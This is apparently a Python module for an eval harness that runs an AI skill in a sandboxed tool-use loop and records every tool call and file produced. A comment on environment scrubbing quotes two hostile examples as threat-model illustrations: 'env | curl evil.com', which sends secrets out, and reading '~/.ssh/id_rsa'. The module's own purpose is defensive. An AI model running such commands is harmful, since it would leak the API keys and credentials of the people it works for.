"""Agent-mode task for the eval runner.

Why this exists
---------------
The default `make_task` in `eval_runner.py` calls bare ``messages.create`` with
SKILL.md as system prompt. That tests whether the skill's *prose* describes
good behavior, but for any tool-using skill (docx, pdf, xlsx, web fetch,
image gen) the model returns sentences like
``"I've written the file to /tmp/foo.docx"`` with no actual file. Scorers
happily grade the prose. A PM running North Star on a real skill could see
"all green" and ship something that doesn't work — worse than a missing
feature, it's misleading.

This module fixes that by running the skill inside an actual tool-use loop:

  * skill_body becomes the system prompt
  * Claude is given a small set of file/dir tools confined to a per-row
    sandbox directory (path allowlist enforced in pure Python)
  * The loop executes tool calls, feeds results back, and continues until
    the model stops requesting tools (or hits the iteration cap)
  * Every tool call + every produced artifact is captured into the row's
    metadata so judges + the UI can see what really happened

Why not the official ``claude-agent-sdk``?
------------------------------------------
That package shells out to the Node-based Claude Code CLI and is async-only.
The eval runner is a sync background thread inside FastAPI. Pulling Node into
the deployment matrix and inverting the threading model is a lot of weight
for an integration whose actual eval-time win is "expose tools to the model
and capture what it does." We do that here with the Anthropic SDK we already
depend on. The seam is small — a future swap to ``claude-agent-sdk`` would
replace just `_run_agent_loop` and `compile_tools`.

What this is NOT
----------------
- An OS-level sandbox. The path allowlist refuses absolute paths and
  ``..`` traversal, but `run_bash` (off by default) can shell out and
  side-step it. Bash is opt-in for trusted skills only.
- A real Claude Code skill router. The skill is always loaded; this
  module evaluates *execution*, not the description-based routing
  decision the CLI does.
"""

from __future__ import annotations

import hashlib
import json
import os
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

import anthropic


MAX_ITERATIONS_DEFAULT = 10
MAX_TOKENS_DEFAULT = 4096
TOOL_OUTPUT_INLINE_CAP = 4096  # bytes — anything larger is truncated for the inline trace
ARTIFACT_PREVIEW_BYTES = 2048
BASH_TIMEOUT_SECONDS = 20

# Allowlist of env vars passed through to run_bash subprocesses. The default
# subprocess.run inherits the *entire* parent env, which includes ANTHROPIC_API_KEY,
# BRAINTRUST_API_KEY, OPENROUTER_API_KEY, DATABASE_URL, AWS creds, GitHub tokens,
# anything `direnv`/`asdf`/`mise` set, etc. A misbehaving (or compromised) skill
# could `env | curl evil.com` and exfiltrate them all in one shot. We replace
# the env wholesale with a fixed, minimal set. Keep the allowlist tiny — only
# add a var here if a skill genuinely cannot function without it AND it carries
# no secret. Anything user-specific (HOME, TMPDIR, USER) is rewritten below to
# point inside the sandbox so a skill that does `cat $HOME/.ssh/id_rsa` reads
# from the workspace, not the developer's actual home directory.
_BASH_ENV_PASSTHROUGH = ("LANG", "LC_ALL", "LANGUAGE")
# PATH is restricted to system binaries only — no /usr/local/bin (homebrew,
# user-installed CLIs), no $HOME/.local/bin, no language version managers.
# Skills that need extra tooling should call them through write_file +
# explicit interpreters instead.
_BASH_PATH = "/usr/bin:/bin"


# --- Tool schemas exposed to Claude ---------------------------------------

def _base_tools() -> list[dict[str, Any]]:
    """Tools the agent always has. All paths are sandbox-relative."""
    return [
        {
            "name": "read_file",
            "description": (
                "Read the contents of a file inside the workspace. "
                "Path is relative to the workspace root. Returns up to 64KB."
            ),
            "input_schema": {
                "type": "object",
                "properties": {"path": {"type": "string"}},
                "required": ["path"],
            },
        },
        {
            "name": "write_file",
            "description": (
                "Write text content to a file inside the workspace. "
                "Creates parent dirs as needed. Overwrites if the file exists."
            ),
            "input_schema": {
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "content": {"type": "string"},
                },
                "required": ["path", "content"],
            },
        },
        {
            "name": "edit_file",
            "description": (
                "Replace the first occurrence of `find` with `replace` in the file at `path`. "
                "`find` must match exactly (whitespace included)."
            ),
            "input_schema": {
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "find": {"type": "string"},
                    "replace": {"type": "string"},
                },
                "required": ["path", "find", "replace"],
            },
        },
        {
            "name": "list_dir",
            "description": "List files/directories under `path` (workspace-relative). Defaults to root.",
            "input_schema": {
                "type": "object",
                "properties": {"path": {"type": "string"}},
            },
        },
    ]


def _bash_tool() -> dict[str, Any]:
    return {
        "name": "run_bash",
        "description": (
            "Run a bash command inside the workspace directory. "
            f"Times out after {BASH_TIMEOUT_SECONDS}s. "
            "Use only for skills that genuinely need shell access — file IO is better via read/write_file."
        ),
        "input_schema": {
            "type": "object",
            "properties": {"command": {"type": "string"}},
            "required": ["command"],
        },
    }


# --- Sandbox path resolution ----------------------------------------------

class SandboxViolation(Exception):
    """Tool tried to read/write a path outside the workspace."""


def _resolve_in_sandbox(workspace: Path, raw_path: str) -> Path:
    """Resolve `raw_path` (workspace-relative) and refuse to leave the workspace.

    This is the only line of defense for `read_file`/`write_file`/`edit_file`/
    `list_dir`. `run_bash` bypasses it — that's why bash is opt-in.
    """
    if raw_path is None:
        raise SandboxViolation("path is required")
    candidate = (workspace / raw_path).resolve()
    workspace_resolved = workspace.resolve()
    try:
        candidate.relative_to(workspace_resolved)
    except ValueError:
        raise SandboxViolation(
            f"path {raw_path!r} resolves outside the workspace ({workspace_resolved})"
        )
    return candidate


# --- Tool implementations -------------------------------------------------

def _execute_tool(
    name: str,
    tool_input: dict[str, Any],
    workspace: Path,
    *,
    allow_bash: bool,
) -> tuple[str, bool]:
    """Run one tool call. Returns (result_text, is_error)."""
    try:
        if name == "read_file":
            target = _resolve_in_sandbox(workspace, tool_input.get("path", ""))
            if not target.exists():
                return (f"file not found: {tool_input.get('path')}", True)
            data = target.read_bytes()[: 64 * 1024]
            try:
                return (data.decode("utf-8"), False)
            except UnicodeDecodeError:
                return (f"<binary file, {len(data)} bytes>", False)

        if name == "write_file":
            target = _resolve_in_sandbox(workspace, tool_input.get("path", ""))
            target.parent.mkdir(parents=True, exist_ok=True)
            content = tool_input.get("content", "")
            if not isinstance(content, str):
                content = str(content)
            target.write_text(content)
            return (f"wrote {len(content)} chars to {tool_input.get('path')}", False)

        if name == "edit_file":
            target = _resolve_in_sandbox(workspace, tool_input.get("path", ""))
            if not target.exists():
                return (f"file not found: {tool_input.get('path')}", True)
            existing = target.read_text()
            find = tool_input.get("find", "")
            replace = tool_input.get("replace", "")
            if find not in existing:
                return (f"`find` string not found in {tool_input.get('path')}", True)
            target.write_text(existing.replace(find, replace, 1))
            return (f"edited {tool_input.get('path')}", False)

        if name == "list_dir":
            target = _resolve_in_sandbox(workspace, tool_input.get("path", "."))
            if not target.exists():
                return (f"directory not found: {tool_input.get('path')}", True)
            if not target.is_dir():
                return (f"not a directory: {tool_input.get('path')}", True)
            entries = sorted(p.name + ("/" if p.is_dir() else "") for p in target.iterdir())
            return ("\n".join(entries) or "<empty>", False)

        if name == "run_bash":
            if not allow_bash:
                return (
                    "run_bash is disabled for this eval. "
                    "Re-run with allow_bash=true if the skill genuinely needs it.",
                    True,
                )
            command = tool_input.get("command", "")
            if not isinstance(command, str) or not command.strip():
                return ("command is required", True)
            # Build a minimal env from scratch — see _BASH_ENV_PASSTHROUGH above
            # for why we don't inherit. HOME/TMPDIR/USER point inside the
            # workspace so even skills that touch ~/.config or write to /tmp
            # stay contained in the per-row sandbox.
            tmp_dir = workspace / ".tmp"
            tmp_dir.mkdir(exist_ok=True)
            child_env: dict[str, str] = {
                "PATH": _BASH_PATH,
                "HOME": str(workspace),
                "TMPDIR": str(tmp_dir),
                "USER": "northstar-eval",
                "SHELL": "/bin/sh",
                "TERM": "dumb",
            }
            for var in _BASH_ENV_PASSTHROUGH:
                value = os.environ.get(var)
                if value is not None:
                    child_env[var] = value
            try:
                proc = subprocess.run(
                    command,
                    shell=True,
                    cwd=str(workspace),
                    capture_output=True,
                    text=True,
                    timeout=BASH_TIMEOUT_SECONDS,
                    env=child_env,
                )
            except subprocess.TimeoutExpired:
                return (f"command timed out after {BASH_TIMEOUT_SECONDS}s", True)
            output_parts: list[str] = []
            if proc.stdout:
                output_parts.append(proc.stdout)
            if proc.stderr:
                output_parts.append(f"[stderr]\n{proc.stderr}")
            output = "\n".join(output_parts) or f"<no output, exit {proc.returncode}>"
            return (output, proc.returncode != 0)

        return (f"unknown tool: {name}", True)
    except SandboxViolation as e:
        return (f"sandbox violation: {e}", True)
    except Exception as e:  # noqa: BLE001
        return (f"{type(e).__name__}: {e}", True)


# --- Trace structures -----------------------------------------------------

@dataclass
class ToolCallTrace:
    name: str
    input: dict[str, Any]
    result: str
    is_error: bool
    duration_ms: int

    def to_dict(self) -> dict[str, Any]:
        # Inline trace stays small; the full payload stays on disk.
        return {
            "name": self.name,
            "input": _truncate_blob(self.input),
            "result": _truncate_text(self.result, TOOL_OUTPUT_INLINE_CAP),
            "is_error": self.is_error,
            "duration_ms": self.duration_ms,
        }


@dataclass
class AgentRunTrace:
    final_text: str
    tool_calls: list[ToolCallTrace] = field(default_factory=list)
    artifacts: list[dict[str, Any]] = field(default_factory=list)
    iterations: int = 0
    stop_reason: str | None = None
    halted: str | None = None  # set when we cut the loop ourselves (iteration cap, etc.)
    workspace: str | None = None

    def to_metadata(self) -> dict[str, Any]:
        return {
            "tool_calls": [c.to_dict() for c in self.tool_calls],
            "artifacts": self.artifacts,
            "iterations": self.iterations,
            "stop_reason": self.stop_reason,
            "halted": self.halted,
            "workspace": self.workspace,
        }


def _truncate_text(text: str, cap: int) -> str:
    if len(text) <= cap:
        return text
    return text[:cap] + f"\n…[truncated, {len(text) - cap} more chars]"


def _truncate_blob(value: Any) -> Any:
    """Cap individual string values inside a tool input dict."""
    if isinstance(value, str):
        return _truncate_text(value, TOOL_OUTPUT_INLINE_CAP)
    if isinstance(value, dict):
        return {k: _truncate_blob(v) for k, v in value.items()}
    if isinstance(value, list):
        return [_truncate_blob(v) for v in value]
    return value


# --- Artifacts ------------------------------------------------------------

def _collect_artifacts(workspace: Path) -> list[dict[str, Any]]:
    """Snapshot every file in the workspace after the agent run.

    The full file lives on disk under the workspace; the manifest carries a
    short preview + sha256 so the UI can render something meaningful without
    inflating the per_row JSON column.
    """
    artifacts: list[dict[str, Any]] = []
    if not workspace.exists():
        return artifacts
    for path in sorted(workspace.rglob("*")):
        if not path.is_file():
            continue
        try:
            data = path.read_bytes()
        except OSError:
            continue
        rel = path.relative_to(workspace).as_posix()
        sha = hashlib.sha256(data).hexdigest()
        preview: str | None
        try:
            preview = data[:ARTIFACT_PREVIEW_BYTES].decode("utf-8")
            if len(data) > ARTIFACT_PREVIEW_BYTES:
                preview += f"\n…[+{len(data) - ARTIFACT_PREVIEW_BYTES} bytes]"
        except UnicodeDecodeError:
            preview = None
        artifacts.append({
            "path": rel,
            "size": len(data),
            "sha256": sha,
            "preview": preview,
            "binary": preview is None,
        })
    return artifacts


# --- The agent loop -------------------------------------------------------

def _run_agent_loop(
    client: anthropic.Anthropic,
    *,
    model: str,
    skill_body: str,
    user_input: str,
    workspace: Path,
    allow_bash: bool,
    max_iterations: int,
    max_tokens: int,
) -> AgentRunTrace:
    tools = _base_tools()
    if allow_bash:
        tools.append(_bash_tool())

    messages: list[dict[str, Any]] = [{"role": "user", "content": user_input}]
    trace = AgentRunTrace(final_text="", workspace=str(workspace))

    for iteration in range(max_iterations):
        trace.iterations = iteration + 1
        response = client.messages.create(
            model=model,
            max_tokens=max_tokens,
            system=skill_body,
            tools=tools,
            messages=messages,
        )
        trace.stop_reason = response.stop_reason

        # Append the assistant turn verbatim — content blocks become the next
        # message's "assistant" turn so the model can reference its own tool calls.
        assistant_blocks = [_block_to_dict(b) for b in response.content]
        messages.append({"role": "assistant", "content": assistant_blocks})

        text_chunks: list[str] = []
        tool_uses: list[Any] = []
        for block in response.content:
            block_type = getattr(block, "type", None)
            if block_type == "text":
                text_chunks.append(getattr(block, "text", ""))
            elif block_type == "tool_use":
                tool_uses.append(block)

        if text_chunks:
            # Always carry forward whatever text the model produced this turn.
            # The "final" text is whatever it said in the last turn before stopping.
            trace.final_text = "\n".join(c for c in text_chunks if c)

        if response.stop_reason != "tool_use" or not tool_uses:
            return trace

        # Dispatch each tool call, build the matching tool_result blocks.
        tool_result_blocks: list[dict[str, Any]] = []
        for use in tool_uses:
            name = getattr(use, "name", "") or ""
            tool_input = getattr(use, "input", {}) or {}
            if not isinstance(tool_input, dict):
                tool_input = {"_raw": tool_input}
            started = time.monotonic()
            result_text, is_error = _execute_tool(
                name, tool_input, workspace, allow_bash=allow_bash,
            )
            duration_ms = int((time.monotonic() - started) * 1000)
            trace.tool_calls.append(ToolCallTrace(
                name=name,
                input=tool_input,
                result=result_text,
                is_error=is_error,
                duration_ms=duration_ms,
            ))
            tool_result_blocks.append({
                "type": "tool_result",
                "tool_use_id": getattr(use, "id", ""),
                "content": _truncate_text(result_text, TOOL_OUTPUT_INLINE_CAP),
                "is_error": is_error,
            })

        messages.append({"role": "user", "content": tool_result_blocks})

    trace.halted = f"iteration cap reached ({max_iterations})"
    return trace


def _block_to_dict(block: Any) -> dict[str, Any]:
    """Round-trip an SDK content block into the dict form messages.create accepts."""
    block_type = getattr(block, "type", None)
    if block_type == "text":
        return {"type": "text", "text": getattr(block, "text", "")}
    if block_type == "tool_use":
        return {
            "type": "tool_use",
            "id": getattr(block, "id", ""),
            "name": getattr(block, "name", ""),
            "input": getattr(block, "input", {}) or {},
        }
    # Fallback — unknown block types are best-effort; toss them through model_dump
    # if Pydantic, otherwise stringify.
    if hasattr(block, "model_dump"):
        return block.model_dump()
    return {"type": block_type or "unknown", "value": str(block)}


# --- Public factory -------------------------------------------------------

def make_agent_task(
    client: anthropic.Anthropic,
    skill_body: str,
    model: str,
    *,
    sandbox_root: Path,
    allow_bash: bool = False,
    max_iterations: int = MAX_ITERATIONS_DEFAULT,
    max_tokens: int = MAX_TOKENS_DEFAULT,
    trace_sink: Callable[[str, AgentRunTrace], None] | None = None,
) -> Callable[[dict], str]:
    """Build a Braintrust-compatible task function that runs the skill in agent mode.

    `trace_sink` is invoked with (row_id, trace) after each row so the eval
    runner can attach the trace to that row's per_row metadata. We can't return
    structured data from the task fn directly — Braintrust wants a string —
    so this side-channel is how rich traces reach `EvalResult.per_row`.
    """
    sandbox_root = Path(sandbox_root)
    sandbox_root.mkdir(parents=True, exist_ok=True)

    def task(row: dict) -> str:
        if isinstance(row, dict):
            user_input = row.get("input")
            if not isinstance(user_input, str):
                # Some callers stuff the whole row as input. Normalize to a string.
                user_input = json.dumps(user_input) if user_input is not None else ""
            row_id = (row.get("metadata") or {}).get("id") or row.get("id") or _digest(user_input)
        else:
            user_input = str(row)
            row_id = _digest(user_input)

        workspace = sandbox_root / str(row_id)
        workspace.mkdir(parents=True, exist_ok=True)

        trace = _run_agent_loop(
            client,
            model=model,
            skill_body=skill_body,
            user_input=user_input,
            workspace=workspace,
            allow_bash=allow_bash,
            max_iterations=max_iterations,
            max_tokens=max_tokens,
        )
        trace.artifacts = _collect_artifacts(workspace)

        if trace_sink is not None:
            try:
                trace_sink(str(row_id), trace)
            except Exception:  # noqa: BLE001
                # Trace sink errors must never poison the eval row itself.
                pass

        return trace.final_text or ""

    return task


def _digest(value: str) -> str:
    return hashlib.sha1(value.encode("utf-8", errors="replace")).hexdigest()[:12]


def attach_traces_to_per_row(
    per_row: list[dict[str, Any]],
    traces: dict[str, AgentRunTrace],
) -> None:
    """Merge agent traces (keyed by row id) into Braintrust's per_row dicts.

    Looks up the row by `metadata.id`; falls back to the digest of the input
    string when no id is present (matches the digest used in `make_agent_task`).
    Mutates `per_row` in place.
    """
    if not traces:
        return
    for row in per_row:
        meta = row.get("metadata") or {}
        rid = meta.get("id")
        if not rid:
            input_val = row.get("input")
            if isinstance(input_val, dict):
                rid = input_val.get("id") or _digest(input_val.get("input") or "")
            elif isinstance(input_val, str):
                rid = _digest(input_val)
        trace = traces.get(str(rid)) if rid else None
        if trace is None:
            continue
        agent_meta = trace.to_metadata()
        merged = dict(meta)
        merged["agent"] = agent_meta
        row["metadata"] = merged


def default_sandbox_root(run_id: str | None = None) -> Path:
    """Per-run sandbox root. Honors NORTH_STAR_EVAL_SANDBOX env var if set."""
    base = os.environ.get("NORTH_STAR_EVAL_SANDBOX")
    if base:
        root = Path(base)
    else:
        root = Path("tmp") / "eval-runs"
    if run_id:
        root = root / run_id
    return root
